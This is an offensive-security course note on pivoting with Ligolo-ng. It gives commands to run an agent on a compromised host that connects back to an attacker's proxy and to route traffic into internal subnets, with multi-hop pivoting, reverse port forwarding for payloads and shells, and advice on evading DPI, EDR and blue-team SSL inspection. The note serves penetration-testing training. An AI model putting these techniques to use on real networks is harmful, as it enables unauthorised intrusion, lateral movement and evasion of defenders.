---
tags: [network, advanced, pivoting, evasion, vapt]
difficulty: advanced
module: "73 - Advanced Network Pivoting Tunnels and Evasion"
topic: "73.05 Ligolo-ng Advanced TUN Interface Pivoting"
---

# 73.05 Ligolo-ng: Advanced TUN Interface Pivoting

## 1. The Evolution of Pivoting Methodologies
For years, penetration testers and red teamers relied heavily on SSH SOCKS proxies, ProxyChains, and Chisel. While functionally effective, these Layer 5 proxying methods possess significant architectural drawbacks:
- SOCKS proxies inherently do not support ICMP (Ping), complicating network discovery.
- UDP support is often spotty, unreliable, or non-existent in many SOCKS proxy implementations.
- `LD_PRELOAD` hooking (used by ProxyChains) fails entirely against statically linked binaries (like Golang tools), bypassing the proxy and leaking sensitive traffic directly onto the local network.
- Managing multiple hops requires complex, fragile, and often slow proxychains configurations.

**Ligolo-ng** represents a massive paradigm shift in offensive network routing. Instead of relying on user-land proxy hooking, Ligolo-ng establishes a full **Layer 3 VPN tunnel** using a virtual `tun` (network tunnel) interface directly on the attacker's machine. This allows seamless routing of all TCP, UDP, and ICMP traffic using native OS kernel routing tables.

## 2. ASCII Architecture Diagram

```text
===============================================================================================
[Attacker Machine]                                        [Compromised Target]
 (Ligolo Server / Proxy)                                     (Ligolo Agent)
  192.168.1.10                                                 10.10.10.50
       |                                                            |
 [tun0 Interface]                                                   |
 (10.0.0.1/24) <============ TLS / MuxRPC Encapsulation ===========>|
       |                                                            |
 Native OS Routing                                                  |
 (ip route add 10.10.20.0/24 via 10.0.0.1)                          |
       |                                                            |
       \------------------------------------------------------------/
                                      |
                               [Internal Subnet]
                                 10.10.20.0/24
                                      |
                           [Target A: 10.10.20.100]
                           (Responds directly to Ping, UDP, TCP)
===============================================================================================
```

## 3. Ligolo-ng Architecture and Core Components
Ligolo-ng is a lightweight, compiled application written in Golang, consisting of two primary components:

1. **The Proxy (Server)**: This runs on the attacker's machine. It interfaces with the local OS to create the virtual `tun` interface and listens on a specified port for incoming connections from compromised agents.
2. **The Agent (Client)**: This is executed on the compromised target machine. It connects back to the proxy over a highly encrypted TLS TCP connection.

Ligolo-ng multiplexes all Layer 3 network traffic over this single TCP connection. Because it operates at Layer 3, it perfectly simulates a local network presence on the target subnet, drastically reducing the OPSEC footprint compared to traditional SOCKS proxies.

## 4. Setting Up the Ligolo-ng Environment

### 4.1. Step 1: Creating the TUN Interface (Attacker Machine)
Before starting the proxy server, you must configure a local `tun` interface. This step modifies kernel network interfaces and thus requires `root` privileges.

```bash
# Create the tun interface and assign it to your specific user
sudo ip tuntap add user <your_username> mode tun ligolo

# Bring the interface up
sudo ip link set ligolo up
```
This creates a virtual network interface named `ligolo` that your regular, unprivileged user account can now control.

### 4.2. Step 2: Starting the Proxy Server
Start the proxy to begin listening for incoming agents. By default, Ligolo-ng uses Let's Encrypt if a valid domain is provided, or it generates self-signed certificates.

```bash
./proxy -selfcert
```
The proxy will listen on port `11601` by default and drop you into an interactive command-line interface (CLI).

### 4.3. Step 3: Executing the Agent
Transfer the agent binary (available for Linux or Windows) to the target machine and execute it.

```bash
./agent -connect 192.168.1.10:11601 -ignore-cert
```
Once connected successfully, the Proxy CLI on your attacker machine will trigger an alert notifying you of a new agent connection.

## 5. Network Routing and Session Management

Unlike SOCKS proxies where traffic is routed per-application, Ligolo-ng does not automatically route traffic upon connection. You must explicitly select the agent session and configure your local kernel routing table.

### 5.1. Session Initialization
Inside the Ligolo-ng proxy CLI:
```text
ligolo-ng » session
? Select a session:
  > 1 - user@WIN-SERVER (10.10.10.50)
```
Once the session is selected, type the `start` command to initialize the tunnel.

### 5.2. Kernel IP Routing Configuration
Now, you must instruct your local Linux kernel to route all traffic destined for the internal subnet through the newly active `ligolo` tun interface.

```bash
# Executed in a separate attacker terminal
sudo ip route add 10.10.20.0/24 dev ligolo
```

At this point, your local machine acts as if it is physically plugged into the `10.10.20.0/24` subnet. You can natively ping `10.10.20.100`, run complex `nmap -sU` UDP scans, and execute static binaries flawlessly without ever needing `proxychains`.

## 6. Advanced Operational Features

### 6.1. Double and Multi-Hop Pivoting
Ligolo-ng handles complex double pivoting elegantly without configuration spaghetti. If you compromise a machine in `10.10.20.0/24` and discover another isolated network `10.10.30.0/24`:
1. Use the current active Ligolo tunnel to forward a port using Ligolo's built-in listener command.
2. Start a *new* agent on the second target, pointing back to the forwarded port on the first target.
3. The new agent appears directly in your Proxy CLI. Select the new session, start it, and add the new OS route (`ip route add 10.10.30.0/24 dev ligolo`).

### 6.2. Reverse Port Forwarding
Ligolo-ng can expose services from your attacker machine deep into the internal network.
In the Proxy CLI:
```text
ligolo-ng » listener add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```
This opens port 8080 on the compromised target, immediately forwarding any traffic it receives back to port 80 on your attacker machine (highly useful for hosting secondary payloads or catching internal reverse shells).

## 7. Evasion and Security Considerations
- **TLS Encapsulation**: All traffic between the Agent and Proxy is wrapped in TLS. To Deep Packet Inspection and EDR network monitors, it looks identical to standard HTTPS or TLS traffic, completely obscuring the anomalous raw proxy traffic.
- **No Disk Footprint**: The agent binary can be executed entirely in memory using techniques like PowerShell reflective loading or `execute-assembly` in C2 frameworks (e.g., Cobalt Strike, Mythic).
- **Certificate Pinning**: By avoiding the `-ignore-cert` flag and explicitly providing the proxy's TLS certificate hash to the agent, you prevent Man-in-the-Middle (MITM) attacks and blue team SSL inspection proxies from intercepting the tunnel.

## 8. Limitations
- The proxy setup fundamentally requires root privileges to create the `tun` interface (though the proxy binary itself can run as an unprivileged user afterward).
- It relies entirely on a single multiplexed TCP connection. In environments with exceptionally high latency or packet loss, it can suffer from TCP retransmission overhead (TCP Meltdown).

## 9. Chaining Opportunities
- Ligolo-ng effectively renders [[03 - ProxyChains and Traffic Routing]] obsolete for the majority of use cases, drastically simplifying offensive tool execution.
- Can be used in conjunction with standard C2 beacons to provide full VPN-like access alongside the asynchronous C2 communication channel.
- If Ligolo-ng binaries cannot be dropped on disk or executed in memory, attackers must fallback to [[02 - SSH Tunneling and SOCKS Proxies]] or [[04 - Chisel for TCP UDP Tunneling]].

## 10. Related Notes
- [[01 - Port Forwarding Local Remote and Dynamic]]
- [[02 - SSH Tunneling and SOCKS Proxies]]
- [[03 - ProxyChains and Traffic Routing]]
- [[04 - Chisel for TCP UDP Tunneling]]
